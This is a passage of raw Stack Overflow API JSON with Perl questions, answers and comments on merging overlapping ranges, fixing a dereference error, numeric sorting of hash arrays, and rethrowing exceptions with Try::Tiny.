"accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": true, "score": 0, "last_activity_date": 1532973568, "creation_date": 1532973568, "answer_id": 51599785, "question_id": 51598375, "link": "https://stackoverflow.com/questions/51598375/get-highest-range-from-the-overlapping-ranges/51599785#51599785", "title": "Get highest range from the overlapping ranges", "body": "<p>Here is an example of a brute force approach. For each interval, we check if it is contained within any of the other intervals. Needless to say, this could become very slow depending on the amount of data (the number of lines in the input file):</p>\n\n<pre><code>use feature qw(say);\nuse strict;\nuse warnings;\n\nmy $fn = 'input.txt';\nopen ( my $fh, '&lt;', $fn ) or die \"Could not open file '$fn': $!\";\nmy @ranges;\nwhile (my $line = &lt;$fh&gt; ) {\n    chomp $line;\n    my ( $chr, $low, $high ) = split \" \", $line;\n    push @ranges, {chr =&gt; $chr, range =&gt; [$low, $high]};\n}\nclose $fh;\nmy @result;\nRANGE: for my $i (0..$#ranges) {\n    my ( $low, $high ) = @{ $ranges[$i]-&gt;{range} };\n    for my $j (0..$#ranges) {\n        next if $i == $j;\n        my ($low2, $high2) = @{ $ranges[$j]-&gt;{range} };\n        next RANGE if $low&gt;= $low2 &amp;&amp; $high&lt;= $high2;\n    }\n    push @result, $ranges[$i];\n}\n\nfor my $range (@result) {\n    say join \"\\t\", $range-&gt;{chr}, @{ $range-&gt;{range} };\n}\n</code></pre>\n\n<p><strong>Output</strong>:</p>\n\n<pre><code>chr1A   77568   86766\nchr1A   203138  204427\nchr1A   204428  222994\nchr1A   222995  223876\nchr1A   223882  227109\nchr1A   305432  314629\nchr1A   323643  325976\nchr1A   431741  451601\n</code></pre>\n"}], "owner": {"reputation": 169, "user_id": 5106204, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/ea44da36974d202ff23940ec61348965?s=128&d=identicon&r=PG&f=1", "display_name": "SSh", "link": "https://stackoverflow.com/users/5106204/ssh"}, "delete_vote_count": 1, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "closed_date": 1532981273, "accepted_answer_id": 51599785, "answer_count": 1, "score": -4, "last_activity_date": 1532973568, "creation_date": 1532967849, "question_id": 51598375, "link": "https://stackoverflow.com/questions/51598375/get-highest-range-from-the-overlapping-ranges", "closed_reason": "Needs more focus", "title": "Get highest range from the overlapping ranges", "body": "<p>I have a file with ranges. I want the highest ranges from the list and remove other small overlapping ranges:</p>\n\n<pre><code>chr1A   77568   86766\nchr1A   203138  204427\nchr1A   204428  222994\nchr1A   204428  206534\nchr1A   206538  207965\nchr1A   207967  213097\nchr1A   213098  221111\nchr1A   213098  213863\nchr1A   213864  214195\nchr1A   214196  221111\nchr1A   221112  222994\nchr1A   222995  223876\nchr1A   223882  227109\nchr1A   305432  314629\nchr1A   323643  325976\nchr1A   431741  451601\nchr1A   431741  435137\nchr1A   435141  436568\nchr1A   436570  441700\nchr1A   441701  449710\nchr1A   441701  442466\nchr1A   442467  442798\nchr1A   442799  449710\nchr1A   449711  451601\n</code></pre>\n\n<p>For example:</p>\n\n<p>The first and second ranges are unique so these are kept.</p>\n\n<p>Third to 11th ranges have overlapping, only highest one <code>chr1A   204428  222994</code> is kept and so on.</p>\n\n<p>I want the output like this:</p>\n\n<pre><code>chr1A   77568   86766\nchr1A   203138  204427\nchr1A   204428  222994\nchr1A   222995  223876\nchr1A   223882  227109\nchr1A   305432  314629\nchr1A   323643  325976\nchr1A   431741  451601\n</code></pre>\n\n<p>I hope to get the solution in perl, bash or any other unix tool. Thanks</p>\n"}, {"tags": ["arrays", "perl", "hash"], "comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 3, "creation_date": 1532965888, "post_id": 51597682, "comment_id": 90161539, "body": "One of the keys or indexes in your data structure that you&#39;re using, doesn&#39;t exist. But (obviously, I&#39;d hope) without seeing that data structure, we have no chance at all of working out what the problem is."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1532971279, "post_id": 51597682, "comment_id": 90164411, "body": "Mostl likely, <code>$self-&gt;{&#39;r_instrDataEvent&#39;}{&#39;ulsaStats&#39;} = @a;</code> was used instead of <code>$self-&gt;{&#39;r_instrDataEvent&#39;}{&#39;ulsaStats&#39;} = \\@a;</code>"}, {"owner": {"reputation": 3472, "user_id": 4990392, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/89acc35f0339a9c7e6ae36443a23e2d9?s=128&d=identicon&r=PG&f=1", "display_name": "Dada", "link": "https://stackoverflow.com/users/4990392/dada"}, "edited": false, "score": 2, "creation_date": 1532974838, "post_id": 51597682, "comment_id": 90166243, "body": "<code>$#{...}-&gt;{...}</code> doesn&#39;t look right: <code>$#{...}</code> returns an integer (the last index of the arrayref),  so the <code>-&gt;{...}</code> can&#39;t work and should say something like <code>Can&#39;t use string (&quot;0&quot;) as a HASH ref...</code> if your array has only one element. Moreover, given the order of your warning/error: first, <code>$from_time</code> not initialized in string (your 2nd line), it seems likely that the error (&quot;can&#39;t use string...&quot;) comes from the 3rd line."}], "answers": [{"tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 2, "last_activity_date": 1532967969, "last_edit_date": 1532967969, "creation_date": 1532965938, "answer_id": 51597828, "question_id": 51597682, "link": "https://stackoverflow.com/questions/51597682/perl-index-of-data-structure-not-allowed-by-compiler/51597828#51597828", "title": "Perl: Index of data structure not allowed by compiler", "body": "<p>The error message means that one of these expressions has the value of \"0\":</p>\n\n<pre><code>$self\n$self-&gt;{'r_instrDataEvent'}\n$self-&gt;{'r_instrDataEvent'}{'ulsaStats'}[0]\n</code></pre>\n\n<p>You were clearly not expecting the value of this expression to be \"0\", so you have some debugging to do upstream.</p>\n\n<p>Are you familiar with the perl debugger (<code>perl -d ...</code>)? The debugger would let you run the code to the problematic line above and then inspect those expressions to see exactly where your expectations are not being met.</p>\n"}], "owner": {"reputation": 129, "user_id": 3414559, "user_type": "registered", "accept_rate": 12, "profile_image": "https://graph.facebook.com/1480602384/picture?type=large", "display_name": "Ray", "link": "https://stackoverflow.com/users/3414559/ray"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 58, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1532967969, "creation_date": 1532965446, "question_id": 51597682, "link": "https://stackoverflow.com/questions/51597682/perl-index-of-data-structure-not-allowed-by-compiler", "title": "Perl: Index of data structure not allowed by compiler", "body": "<p>Im assigning the from and to times to the first and last entry below</p>\n\n<pre><code>my $from_time = $self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}-&gt;[0]-&gt;{'epochtime'};\nprint \"$from_time\";\nmy $to_time = $#{$self-&gt;{'r_instrDataEvent'}-&gt;{'ulsaStats'}}-&gt;{'epochtime'};\nprint \"FROM is $from_time to is $to_time\";\n</code></pre>\n\n<p>But this gives the following error (refers to the first 2 lines)</p>\n\n<pre><code>Use of uninitialized value $from_time in string at /data/ddp/current/analysis/TOR/elasticsearch/handlers/UlsaSpectrumAnalyser.pm line 103.\nCan't use string (\"0\") as a HASH ref while \"strict refs\" in use at /data/ddp/current/analysis/TOR/elasticsearch/handlers/UlsaSpectrumAnalyser.pm line 104.\n</code></pre>\n"}, {"tags": ["arrays", "perl"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 3, "creation_date": 1532963870, "post_id": 51597170, "comment_id": 90160358, "body": "<a href=\"https://metacpan.org/pod/perlop#Equality-Operators\" rel=\"nofollow noreferrer\">metacpan.org/pod/perlop#Equality-Operators</a> . See the <code>&lt;=&gt;</code> operator"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532964036, "post_id": 51597170, "comment_id": 90160450, "body": "<i>&quot;get highest value from an array&quot;</i> or <i>&quot;get couple of highest value from an array&quot;</i> Which is it?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 3, "creation_date": 1532964211, "post_id": 51597170, "comment_id": 90160564, "body": "Please don&#39;t use <code>Data::Print</code>: it takes a lot of work to change it into something I can compile. @sobrique: see what you&#39;ve done!"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532964622, "post_id": 51597170, "comment_id": 90160800, "body": "<i>&quot;if i have value greater than 10 sort function doesn&#39;t works correctly&quot;</i> Please post an example of data that <i>doesn&#39;t work</i>. We can hardly fix things that work!"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532964679, "post_id": 51597170, "comment_id": 90160823, "body": "How do <code>messages0.0.log;1</code> etc. relate to your original data? Please show the code that does this. We cannot work without proper information."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532964765, "post_id": 51597170, "comment_id": 90160874, "body": "Is the output an example of what you want, or is it what your code produces?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532965635, "post_id": 51597170, "comment_id": 90161397, "body": "Please give us some Perl code that defines your input array (and I mean compilable Perl code, not that almost-Perl mess that we currently have) along with the output that you require. Without that, we&#39;re just guessing. And that&#39;s just a waste of everyone&#39;s time."}, {"owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "edited": false, "score": 0, "creation_date": 1532983706, "post_id": 51597170, "comment_id": 90170209, "body": "sorry my computer went on vacation (blue screen of death). I re-align myself and I reply to everyone, but I thank you immediately for the many answers &lt;3"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1532986631, "post_id": 51597170, "comment_id": 90171221, "body": "Can you show the actual Perl data structure (your &quot;array&quot;), and specify the sorting criteria (or show exact expected output)?  In other words, can you respond to the comments that people kindly posted (by editing the question appropriately)? It is not possible to help you with what is in the question now.  With a good question you&#39;d have solid answers (a while ago by now) instead of many comments asking for fixes."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1533108109, "post_id": 51597170, "comment_id": 90219420, "body": "@clarkseth: Not really. You still haven&#39;t given us Perl code that defines your array, have you?"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1533108177, "post_id": 51597170, "comment_id": 90219456, "body": "@clarkseth: And looking at your code, it seems you have an array of hashes. That&#39;s mentioned nowhere in your question."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532964908, "post_id": 51597475, "comment_id": 90160969, "body": "Great. Leaving <code>messages0.3</code> etc. in a random order. Do you really think that&#39;s what is required? Please always test your code and post the output."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532965696, "post_id": 51597475, "comment_id": 90161431, "body": "<i>&quot;even if they&#39;re strings&quot;</i> and <i>&quot;even if they&#39;re numbers&quot;</i>. Perl variables are <i>both</i> strings and numbers all of the time. The type of the variable&#39;s contents are prescribed by the <i>operator</i>."}], "tags": [], "owner": {"reputation": 1280, "user_id": 8513648, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1c59086b9318c37cc02acaeb85fef8f6?s=128&d=identicon&r=PG", "display_name": "J-L", "link": "https://stackoverflow.com/users/8513648/j-l"}, "is_accepted": false, "score": 1, "last_activity_date": 1532965613, "last_edit_date": 1532965613, "creation_date": 1532964727, "answer_id": 51597475, "question_id": 51597170, "link": "https://stackoverflow.com/questions/51597170/whats-the-better-way-to-get-highest-couple-of-values-from-an-array-of-keys-in-p/51597475#51597475", "title": "What&#39;s the better way to get highest couple of values from an array of keys in Perl?", "body": "<p>Instead of</p>\n\n<pre><code>my @new_array = sort { $a-&gt;{id} cmp $b-&gt;{id} } @array;\n</code></pre>\n\n<p>try this</p>\n\n<pre><code>my @new_array = sort { $a-&gt;{id} &lt;=&gt; $b-&gt;{id} } @array;\n</code></pre>\n\n<p>The <code>&lt;=&gt;</code> operator treats the fields to compare as numbers instead of strings. It will treat 10 as greater than 3, so it will treat <code>10</code> as greater than <code>03</code>.</p>\n\n<p>The <code>cmp</code> operator treats your values as strings, so it will sort <code>21</code> before <code>3</code> just as it would sort <code>BA</code> before <code>C</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": true, "score": 1, "last_activity_date": 1533109492, "creation_date": 1533109492, "answer_id": 51627951, "question_id": 51597170, "link": "https://stackoverflow.com/questions/51597170/whats-the-better-way-to-get-highest-couple-of-values-from-an-array-of-keys-in-p/51627951#51627951", "title": "What&#39;s the better way to get highest couple of values from an array of keys in Perl?", "body": "<p>This seems to do what you want.</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\nuse feature 'say';\n\n# This seems to be the data structure that you are working with\nmy @data = ( {\n  file =&gt; 'messages1.0.log', id =&gt; 12,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 11,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 10,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 9,\n}, {\n  file =&gt; 'messages0.0.log', id =&gt; 8,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 8,\n}, {\n  file =&gt; 'messages0.0.log', id =&gt; 7,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 7,\n}, {\n  file =&gt; 'messages0.0.log', id =&gt; 6,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 6,\n}, {\n  file =&gt; 'messages0.0.log', id =&gt; 5,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 5,\n}, {\n  file =&gt; 'messages2.0.log', id =&gt; 5,\n}, {\n  file =&gt; 'messages2.1.log', id =&gt; 5,\n}, {\n  file =&gt; 'messages0.0.log', id =&gt; 4,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 4,\n}, {\n  file =&gt; 'messages2.0.log', id =&gt; 4,\n}, {\n  file =&gt; 'messages2.1.log', id =&gt; 4,\n}, {\n  file =&gt; 'messages2.0.log', id =&gt; 3,\n}, {\n  file =&gt; 'messages2.1.log', id =&gt; 3,\n}, {\n  file =&gt; 'messages0.0.log', id =&gt; 3,\n}, {\n  file =&gt; 'messages0.2.log', id =&gt; 3,\n}, {\n  file =&gt; 'messages0.3.log', id =&gt; 3,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 3,\n}, {\n  file =&gt; 'messages2.0.log', id =&gt; 3,\n}, {\n  file =&gt; 'messages2.1.log', id =&gt; 3,\n}, {\n  file =&gt; 'messages0.3.log', id =&gt; 2,\n}, {\n  file =&gt; 'messages0.2.log', id =&gt; 2,\n}, {\n  file =&gt; 'messages0.0.log', id =&gt; 2,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 2,\n}, {\n  file =&gt; 'messages2.0.log', id =&gt; 2,\n}, {\n  file =&gt; 'messages2.1.log', id =&gt; 2,\n}, {\n  file =&gt; 'messages0.0.log', id =&gt; 1,\n}, {\n  file =&gt; 'messages0.2.log', id =&gt; 1,\n}, {\n  file =&gt; 'messages0.3.log', id =&gt; 1,\n}, {\n  file =&gt; 'messages1.0.log', id =&gt; 1,\n}, {\n  file =&gt; 'messages1.1.log', id =&gt; 1,\n}, {\n  file =&gt; 'messages2.0.log', id =&gt; 1,\n}, {\n  file =&gt; 'messages2.1.log', id =&gt; 1,\n});\n\nmy %stats;\n\n# Walk your input data, making a note of the highest\n# id associated with every file.\nfor (@data) {\n  if (($stats{$_-&gt;{file}} // 0) &lt; $_-&gt;{id}) {\n    $stats{$_-&gt;{file}} = $_-&gt;{id};\n  }\n}\n\n# Walk the %stats hash in sorted order, printing\n# the file and the maximum associated id.\nfor ( sort my_clever_sort keys %stats) {\n  say join ';', $_, $stats{$_};\n}\n\n# (Slightly) clever sorting algorithm\nsub my_clever_sort {\n  # Extract the floating point numbers from the filenames\n  my ($str_num_a) = $a =~ /(\\d+\\.\\d+)/;\n  my ($str_num_b) = $b =~ /(\\d+\\.\\d+)/;\n\n  # Sort by id (descending) and then filename (ascending)\n  return ($stats{$b} &lt;=&gt; $stats{$a}) || ($str_num_a &lt;=&gt; $str_num_b);\n}\n</code></pre>\n"}], "owner": {"reputation": 229, "user_id": 1195443, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/2eb518cdd36536d35b63cfb9d29f9af3?s=128&d=identicon&r=PG", "display_name": "clarkseth", "link": "https://stackoverflow.com/users/1195443/clarkseth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 104, "favorite_count": 0, "accepted_answer_id": 51627951, "answer_count": 2, "score": 1, "last_activity_date": 1533472505, "creation_date": 1532963714, "last_edit_date": 1533472505, "question_id": 51597170, "link": "https://stackoverflow.com/questions/51597170/whats-the-better-way-to-get-highest-couple-of-values-from-an-array-of-keys-in-p", "title": "What&#39;s the better way to get highest couple of values from an array of keys in Perl?", "body": "<p></p>\n\n<p>What's the better way to get the  highest value from an array of hashes? I want to get highest ID value from each file, content in my array (keys are file name and ID).</p>\n\n<p>my <code>@array</code> contains these values</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>[\n    { file =&gt; \"messages0.0\", id =&gt; \"1\", },\n    { file =&gt; \"messages0.1\", id =&gt; \"2\", },\n    { file =&gt; \"messages0.3\", id =&gt; \"3\", },\n    { file =&gt; \"messages1.0\", id =&gt; \"1\", },\n    { file =&gt; \"messages1.1\", id =&gt; \"2\", },\n    { file =&gt; \"messages2.0\", id =&gt; \"1\", },\n    { file =&gt; \"messages2.1\", id =&gt; \"1\", }\n]\n</code></pre>\n\n<p>If I use</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>my @new_array = sort { $b-&gt;{id} &lt;=&gt; $a-&gt;{id} } @array; \n</code></pre>\n\n<p>If I have value greater than 10 then <code>sort</code> function doesn't works correctly</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>messages0.0.log;1\nmessages1.0.log;1\nmessages2.0.log;1\nmessages2.1.log;1\nmessages1.0.log;10\nmessages1.0.log;11\n</code></pre>\n\n<p>Here is my array content (with field separated by <code>;</code> for a better view</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>messages1.0.log;12\nmessages1.0.log;11\nmessages1.0.log;10\nmessages1.0.log;9\nmessages0.0.log;8\nmessages1.0.log;8\nmessages0.0.log;7\nmessages1.0.log;7\nmessages0.0.log;6\nmessages1.0.log;6\nmessages0.0.log;5\nmessages1.0.log;5\nmessages2.0.log;5\nmessages2.1.log;5\nmessages0.0.log;4\nmessages1.0.log;4\nmessages2.0.log;4\nmessages2.1.log;4\nmessages2.0.log;3\nmessages2.1.log;3\nmessages0.0.log;3\nmessages0.2.log;3\nmessages0.3.log;3\nmessages1.0.log;3\nmessages2.0.log;3\nmessages2.1.log;3\nmessages0.3.log;2\nmessages0.2.log;2\nmessages0.0.log;2\nmessages1.0.log;2\nmessages2.0.log;2\nmessages2.1.log;2\nmessages0.0.log;1\nmessages0.2.log;1\nmessages0.3.log;1\nmessages1.0.log;1\nmessages1.1.log;1\nmessages2.0.log;1\nmessages2.1.log;1\n</code></pre>\n\n<p>My desired output is</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>messages1.0.log;12\nmessages0.0.log;8\nmessages2.0.log;5\nmessages2.1.log;5\nmessages0.2.log;3\nmessages0.3.log;3\nmessages1.1.log;1\n</code></pre>\n\n<pre class=\"lang-perl prettyprint-override\"><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nmy $STAT = \".logstatistics\";\n\nopen( STAT, '&gt;', $STAT ) or die $!;\n\nmy @new_array = sort { $b-&gt;{id} &lt;=&gt; $a-&gt;{id} } @array;\n\n# Print Log statistics\nforeach my $entry ( @new_array ) {\n    print STAT join ';', $entry-&gt;{file}, \"$entry-&gt;{id}\\n\";\n}\n\nclose( STAT );\n</code></pre>\n\n<p>To help me with the analysis I've written the following code to load the array from a file</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>open( STAT, $STAT );\n\nwhile ( &lt;STAT&gt; ) {\n    my @lines = split /\\n/;\n    my ( $file, $id ) = $lines[0] =~ /\\A(.\\w.*);(\\d.*)/;\n    push @array, { file =&gt; $file, id =&gt; $id, };\n}\n\nclose( STAT );\n</code></pre>\n\n<p>I've solved my problem with an <code>if</code> statement into data loading into <code>@array</code>.\nif the old value of the file name is the same as the current value it is skipped.\nIn this way, I have only one value for each file.</p>\n"}, {"tags": ["perl", "exception-handling", "eval"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1532960611, "post_id": 51596162, "comment_id": 90158168, "body": "Umm, why are you using <code>eval</code> with <code>try</code>? Just take out the <code>eval</code>!"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532960677, "post_id": 51596162, "comment_id": 90158214, "body": "Don&#39;t use <code>print Dumper</code> on references to scalars. <code>print Dumper \\@array</code> and <code>print Dumper \\%hash</code> are fine."}], "answers": [{"comments": [{"owner": {"reputation": 198290, "user_id": 1030675, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/957956ce51706d03f19a4dc85a767bb1?s=128&d=identicon&r=PG", "display_name": "choroba", "link": "https://stackoverflow.com/users/1030675/choroba"}, "edited": false, "score": 1, "creation_date": 1532963033, "post_id": 51596650, "comment_id": 90159825, "body": "Using <code>if $@</code> might not behave correctly, see <a href=\"https://www.perlmonks.org/?node_id=1153468\" rel=\"nofollow noreferrer\">perlmonks.org/?node_id=1153468</a>"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532972236, "post_id": 51596650, "comment_id": 90164890, "body": "I can&#39;t fathom what problem you&#39;re solving here. Surely the <code>catch</code> subroutine can filter the exception just as easily and with less awkwardness?"}, {"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 2, "creation_date": 1532972619, "post_id": 51596650, "comment_id": 90165084, "body": "My reading of the OP is that the <code>try</code> block contains obscure and immutable <code>eval</code> calls whose exceptions must be rethrown as <code>Class::Exception</code>"}], "tags": [], "owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "is_accepted": false, "score": 1, "last_activity_date": 1532963403, "last_edit_date": 1532963403, "creation_date": 1532962047, "answer_id": 51596650, "question_id": 51596162, "link": "https://stackoverflow.com/questions/51596162/perl-messing-try-catch-with-eval/51596650#51596650", "title": "Perl - messing try/catch with eval", "body": "<p>If an exception is encountered inside an <code>eval</code> block, the return value of the block is <code>undef</code> (or an empty list in list context) and Perl sets the special variable <code>$@</code> with the error message. The error message is usually a simple scalar but it can be a reference or blessed reference -- one way that it gets set is with the argument to a <code>die</code> call, and any type of value may be passed to that function.</p>\n\n<pre><code>try {\n    eval {\n        T-&gt;throw(\"Oops\"); 1;\n    } or do {\n        warn \"Exception caught in eval: $@\";\n        # rethrow the exception outside eval\n        if (ref($@) eq 'T') {\n            $@-&gt;rethrow;\n        } else {\n            T-&gt;throw(\"Oops: $@\");\n        }\n    }\n} catch {\n    print Dumper \\$_;\n};\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 3, "last_activity_date": 1532994828, "creation_date": 1532994828, "answer_id": 51603709, "question_id": 51596162, "link": "https://stackoverflow.com/questions/51596162/perl-messing-try-catch-with-eval/51603709#51603709", "title": "Perl - messing try/catch with eval", "body": "<p>You can automatically upconvert exceptions as follows:</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse warnings;\nuse feature qw( say );\n\nuse Try::Tiny;\nuse Exception::Class ('T');\n\n$SIG{__DIE__} = sub {\n   die($_[0]) if !defined($^S);\n   die($_[0]) if ref($_[0]) eq 'T';\n   T-&gt;throw($_[0]);\n};\n\ntry {\n    die \"foo\";\n} catch {\n    say ref($_) || \"Not reference\";\n    print $_;\n};\n\ntry {\n    T-&gt;throw(\"foo\");\n} catch {\n    say ref($_) || \"Not reference\";\n    say $_;\n};\n</code></pre>\n"}], "owner": {"reputation": 37, "user_id": 1999786, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c7495dd6d79caf02cbef2bc28eda148?s=128&d=identicon&r=PG", "display_name": "Eldhenn", "link": "https://stackoverflow.com/users/1999786/eldhenn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 389, "favorite_count": 0, "answer_count": 2, "score": 3, "last_activity_date": 1532994828, "creation_date": 1532960534, "question_id": 51596162, "link": "https://stackoverflow.com/questions/51596162/perl-messing-try-catch-with-eval", 